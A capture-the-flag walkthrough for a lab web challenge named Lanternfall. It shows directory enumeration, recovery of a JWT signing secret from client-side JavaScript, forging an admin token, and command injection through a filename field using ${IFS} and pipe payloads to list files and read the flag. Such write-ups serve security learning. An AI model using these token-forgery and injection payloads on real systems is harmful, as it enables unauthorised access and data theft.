## Lanternfall

<img width="1873" height="744" alt="image" src="https://github.com/user-attachments/assets/fdfe347f-c9c0-4933-88d5-a609b14eb9b4" />

## firts i run this Gobuster command to find endpoints

```
gobuster dir -u http://83.136.250.108:31180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**`i found :`**

<img width="1072" height="367" alt="image" src="https://github.com/user-attachments/assets/5c1eb491-9787-4a23-92f7-b52ba8f228d7" />

```
/admin
```

> ### when i opened **`/admin`** it return **`404`**

<img width="1903" height="749" alt="image" src="https://github.com/user-attachments/assets/718e9f1e-c404-410c-aef7-bf9c13447319" />

> but i found in burp sitemap this path

<img width="1312" height="777" alt="image" src="https://github.com/user-attachments/assets/f264fabd-4685-470d-a7e9-53a46f8e9b07" />

```
/_next/static/chunks/pages/admin-8fd9c6420ad81ca8.js
```

> ## after open it i found js code and in it i found key to jwt

<img width="930" height="174" alt="image" src="https://github.com/user-attachments/assets/8dc8a945-2511-4bbe-b03e-de32813ba0d9" />

```
ayame_moonlight_gekko_secret_key_for_jwt_signing_do_not_use_in_production_2024
```

> ## i create account **`admin:123456`**

<img width="935" height="335" alt="image" src="https://github.com/user-attachments/assets/2ac33d8a-231a-4045-8837-1af3b6b334a8" />

after that i login the website and i get jwt

<img width="1481" height="394" alt="image" src="https://github.com/user-attachments/assets/578c7980-595a-458d-adf3-205122f58e00" />

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZW1haWwiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc2NDA4MzU4NywiZXhwIjoxNzY0MDg3MTg3LCJqdGkiOiIxYTQwMWQzMC1hN2Y2LTRlNzctODMzMC1kYjMzZWYwOGExMzUifQ.QRSnhgbu61jhsg2_COJ6iNDqjG_ok1YcQ6Y7WgERnfo
```

 <img width="1490" height="574" alt="image" src="https://github.com/user-attachments/assets/4fd0b83f-1c88-4b43-8cc0-bb336f79274c" />

> ### now i will try to change the role with key that i found:

<img width="1487" height="592" alt="image" src="https://github.com/user-attachments/assets/5ea50b6e-a52a-4a18-a212-d363b8eac6a1" />

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NjQwODM1ODcsImV4cCI6MTc2NDA4NzE4NywianRpIjoiMWE0MDFkMzAtYTdmNi00ZTc3LTgzMzAtZGIzM2VmMDhhMTM1In0.6b-KJU07GJrRtQx9nud-7zr0PYcXNkh0290iy9iFSCQ"
}
```

> ### there was another path in js code that we found

<img width="773" height="196" alt="image" src="https://github.com/user-attachments/assets/7bc39c37-f5d6-4c46-a066-d13108dafd89" />

```
/api/admin/files
```

> ### i send get request to it and server say **`Method not allowed`** so i send post request:

<img width="1323" height="378" alt="image" src="https://github.com/user-attachments/assets/1ca011b3-a53a-49db-94b2-a691ee18bc81" />

```json
{
  "error": "Report type, format, and filename are required"
}
```

> ## so we need to send **`report type`** , **`format`** , **`filename`**

<img width="710" height="88" alt="image" src="https://github.com/user-attachments/assets/0e7e9a50-6848-4b87-8815-30f9883d9ec9" />

> so i put the **`reportType`** value **`user_activity`**

> ## and file created successfully

<img width="1490" height="435" alt="image" src="https://github.com/user-attachments/assets/88b060d1-56ab-47a9-a7d5-ce0d025a224e" />

> ## now what if i can do command excution in **`filename`** i try:

> ## i try :

```json
{
  "reportType": "user_activity",

  "format": "txt",

  "filename": "frank.txt; id;"
}
```

**`but it response with`**

```json
{ "error": "Filename must not contain whitespace characters" }
```

> ## so i try **`${IFS}`**

> ## when i try :

```
{

  "reportType":"user_activity",

  "format":"txt",

  "filename": ";ls${IFS}-la;"

}
```

<img width="750" height="217" alt="image" src="https://github.com/user-attachments/assets/f918f6da-7c53-4f36-a02d-2f18d56482cd" />

> ## so the user system is **`sqlite cli`**

```json
{
  "reportType": "user_activity",

  "format": "txt",

  "filename": "\"|ls${IFS}-la${IFS}/${IFS}1>&2\""
}
```

<img width="1499" height="578" alt="image" src="https://github.com/user-attachments/assets/bb36038c-e33e-43c5-a91a-8f9f7d39a2d1" />

> ## now read the flag

```json
{
  "reportType": "user_activity",

  "format": "txt",

  "filename": "\"|cat${IFS}/flag.txt${IFS}1>&2\""
}
```

<img width="1499" height="507" alt="image" src="https://github.com/user-attachments/assets/8103eea2-0b59-4370-bf6f-68beb8d180b3" />

```
HTB{4y4m3_g3kk0_m00nl1ght_4ll3ys**********************97b4b5b2f}
```

![DespicableMeMinionsGIF](https://github.com/user-attachments/assets/2ed952f7-c201-4aab-b2f9-74c0cc694353)

